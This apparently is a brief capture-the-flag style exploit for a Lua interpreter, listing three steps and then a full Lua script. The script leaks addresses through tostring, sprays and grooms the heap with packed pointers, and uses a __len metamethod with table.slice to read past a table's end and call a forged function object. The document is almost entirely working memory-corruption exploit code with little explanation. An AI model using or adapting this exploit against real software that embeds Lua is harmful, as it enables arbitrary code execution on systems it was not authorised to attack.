1. spray fake object contents
2. read fake object header out of bounds
3. call fake object (function)


```py
function addrof(v)
    local strrep = tostring(v)
    local i = string.find(strrep, '0x')
    if i == nil then
        error("Cannot obtain address of given value")
    end
    return tonumber(string.sub(strrep, i+2), 16)
end

function hex(v)
    return string.format("0x%x", v)
end

function hexdump(buf)
    local str = ''
    for i=1,math.ceil(#buf/16) * 16 do
        if (i-1) % 16 == 0 then
            str = str .. string.format('%08X  ', i-1)
        end
        str = str .. (i > #buf and '   ' or string.format('%02X ', buf:byte(i)))
        if i %  8 == 0 then
            str = str .. ' '
        end
        if i % 16 == 0 then
            str = str .. '\n'
        end
    end
    return str
end

print("start")
collectgarbage("stop")
win_addr = addrof(print) - 0x1def0

packed_string = string.pack("<L",win_addr)

spray = {}
spray2 = {}
for i = 1000,2000 do
    spray2[i] =  packed_string .. "xxxx" .. i
end

for i = 1000,2000 do
    spray[i] =  packed_string .. "iiii" .. i
end
spray_addr = addrof(spray) +0xc8 - 24
print("spray @ " .. spray_addr)


groom = {}
for i = 1000,9999 do
    groom[i] = "AAAAAAAAAAAAAAAAAAAAAAAACCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .. i
end



a = {}
a[1] = 1
a[2] = 2
a[3] = 3
a[4] = 4
a[5] = 5
a[6] = 5



m = { __len = function (tbl) return 64 end }
setmetatable(a, m)
fake =  "AAAABBBB" .. "AAAABBBB" .. "\x03\x00\x00\x00\x00\x00\x00\x00"  .. string.pack("<L", spray_addr)  .. "\x26\x00\x00\x00\x00\x00\x00\x00"   .. "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

b = table.slice(a, 1, 64)
func_index = 0

for i = 1,128 do
    if type(b[i]) == 'number' then
        print(i, hex(b[i]))
    end
    if b[i] == 0x4242424241414141 then 
        func_index = i+1
        break
    end
end

b[func_index]()

while(true)
do
end
```
